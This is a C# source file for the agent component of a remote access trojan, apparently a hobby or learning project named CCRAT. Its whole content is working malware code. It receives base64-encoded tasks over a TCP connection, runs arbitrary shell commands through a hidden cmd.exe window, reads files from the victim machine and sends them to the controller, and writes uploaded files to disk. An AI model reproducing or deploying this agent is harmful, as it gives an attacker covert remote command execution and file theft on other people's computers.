using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace CCRAT_AGENT
{
    class CCRatAgent
    {
        TcpClient client;
        public CCRatAgent(TcpClient client)
        {
            this.client = client;
        }

        public void WaitForTasking()
        {
            StreamReader reader = new StreamReader(client.GetStream());

            while (true)
            {
                string inbound = reader.ReadLine();

                string json = Encoding.UTF8.GetString(Convert.FromBase64String(inbound));

                CommsPackage tasking = JsonConvert.DeserializeObject<CommsPackage>(json);

                HandleTasking(tasking);
            }
        }

        private void HandleTasking(CommsPackage tasking)
        {
            Console.WriteLine("Tasking recieved: " + tasking.Command);
            switch (tasking.Command) { //why not use an enum?
                case "exec":
                    Exec(tasking.Data);
                    break;
                case "download":
                    Download(tasking.Data);
                    break;
                case "upload":
                    Upload(tasking.Data);
                    break;
                case "sysinfo":
                    //SysInfo(); //ToDo
                    break;
                case "tasklist":
                    //TaskList(); //ToDo
                    break;
                case "netlist":
                    //NetList(); //ToDo
                    break;
                default:
                    break;
            }
        }

        private void Exec(byte[] args)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + Encoding.UTF8.GetString(args);
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false; //yikes
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit(); //yikes

            string stderr = process.StandardError.ReadToEnd();
            string stdout = process.StandardOutput.ReadToEnd();

            byte[] output = Encoding.UTF8.GetBytes(stderr + stdout);

            PackAndSend("exec", output);
        }
        private void Download(byte[] args)
        {
            Console.WriteLine("Processing download");
            try
            {
                FileInfo fi = JsonConvert.DeserializeObject<FileInfo>(Encoding.UTF8.GetString(args));
                fi.Data = File.ReadAllBytes(fi.Path);
                byte[] payload = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(fi));
                PackAndSend("download", payload);
            }
            catch
            {
                //fail silently
            }
        }
        private void Upload(byte[] args)
        {
            Console.WriteLine("Processing upload");
            try
            {
                FileInfo fi = JsonConvert.DeserializeObject<FileInfo>(Encoding.UTF8.GetString(args));
                File.WriteAllBytes(fi.Path, fi.Data);
            }
            catch
            {
                //fail silently
            }
            
        }

        private void PackAndSend(string type, byte[] payload)
        {

            CommsPackage package = new CommsPackage();
            package.Command = type;
            package.Data = payload;

            string json = JsonConvert.SerializeObject(package);

            string final = Convert.ToBase64String(Encoding.UTF8.GetBytes(json));

            StreamWriter writer = new StreamWriter(client.GetStream());

            writer.WriteLine(final);
            writer.Flush();
        }
    }
}
